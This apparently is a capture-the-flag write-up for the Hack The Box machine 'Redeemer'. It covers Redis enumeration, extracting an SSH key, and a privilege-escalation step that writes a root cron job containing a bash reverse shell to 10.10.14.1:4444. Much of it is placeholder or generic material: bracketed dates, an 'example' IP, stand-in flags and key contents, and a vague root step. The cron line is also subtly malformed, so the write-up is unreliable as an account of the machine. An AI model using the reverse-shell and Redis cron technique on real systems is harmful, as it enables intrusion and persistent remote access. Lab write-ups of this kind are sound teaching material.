# Hack The Box - Redeemer Writeup

## Machine Information
- **Name:** Redeemer
- **Difficulty:** Easy
- **Category:** Web
- **Points:** 20
- **Release Date:** [Date]
- **Retire Date:** [Date]
- **IP Address:** 10.10.10.4 (example)

## Reconnaissance

### Port Scanning
```bash
# Initial nmap scan
nmap -sC -sV -oN nmap_initial 10.10.10.4

# Results
PORT     STATE SERVICE  VERSION
6379/tcp open  redis    Redis key-value store 5.0.7
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Service Analysis
The machine is running Redis on port 6379. Redis is an in-memory data structure store that can be vulnerable if not properly secured.

## Initial Access

### Redis Enumeration
```bash
# Connect to Redis
redis-cli -h 10.10.10.4

# Basic commands
info
keys *
dbsize
```

### Redis Exploitation
Redis is running without authentication, which allows us to access and manipulate data:

```bash
# List all keys
keys *

# Get specific values
get user
get password
```

### SSH Key Discovery
We find SSH keys stored in Redis:

```bash
# Dump SSH private key
get ssh_key

# Save to file
echo "-----BEGIN OPENSSH PRIVATE KEY-----
(contents from redis)
-----END OPENSSH PRIVATE KEY-----" > id_rsa
```

### SSH Access
```bash
# Set proper permissions
chmod 600 id_rsa

# SSH login
ssh -i id_rsa user@10.10.10.4
```

## Privilege Escalation

### User Enumeration
```bash
# Check current user
whoami
id

# Check sudo permissions
sudo -l
```

### System Enumeration
```bash
# Check running processes
ps aux

# Check network connections
netstat -tlnp

# Check cron jobs
crontab -l
cat /etc/crontab
```

### Redis Persistence
Since we have Redis access, we can use it for privilege escalation:

```bash
# From SSH session, connect to Redis
redis-cli

# Create a cron job for root
config set dir /var/spool/cron/crontabs/
config set dbfilename root
set cron "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'"
save
```

### Alternative Privilege Escalation
```bash
# Check for SUID binaries
find / -perm -4000 2>/dev/null

# Check for writable files
find / -writable -type f 2>/dev/null | head -20

# Check kernel version
uname -a
```

### Root Access
Using the Redis cron job persistence or other privilege escalation vectors to gain root access.

## Flags

### User Flag
```bash
cat /home/user/user.txt
HTB{user_flag_content}
```

### Root Flag
```bash
cat /root/root.txt
HTB{root_flag_content}
```

## Key Learnings

1. **Redis Security**: Insecure Redis instances can lead to complete compromise
2. **SSH Key Management**: SSH keys stored insecurely are dangerous
3. **NoSQL Databases**: Redis and similar databases need proper security
4. **Cron Job Exploitation**: System automation can be abused
5. **Persistence Techniques**: Maintaining access through various methods

## Tools Used

- nmap (port scanning)
- redis-cli (Redis interaction)
- ssh (remote access)
- netcat (reverse shells)
- find (file system enumeration)

## Attack Timeline

1. **Reconnaissance** (10 minutes): Port scanning and service identification
2. **Redis Enumeration** (10 minutes): Database access and key discovery
3. **SSH Key Extraction** (5 minutes): Private key retrieval
4. **SSH Access** (5 minutes): User shell access
5. **Privilege Escalation** (15 minutes): From user to root
6. **Flag Hunting** (5 minutes): Locating and capturing flags

**Total Time:** ~50 minutes

## Prevention

1. **Redis Security**: Configure authentication and bind to localhost
2. **SSH Key Security**: Protect private keys and use proper permissions
3. **Database Access**: Implement proper access controls
4. **Cron Job Security**: Validate and secure automated tasks
5. **Network Segmentation**: Isolate services from external access

## References

- Hack The Box Redeemer machine
- Redis security best practices
- SSH key management
- Linux privilege escalation techniques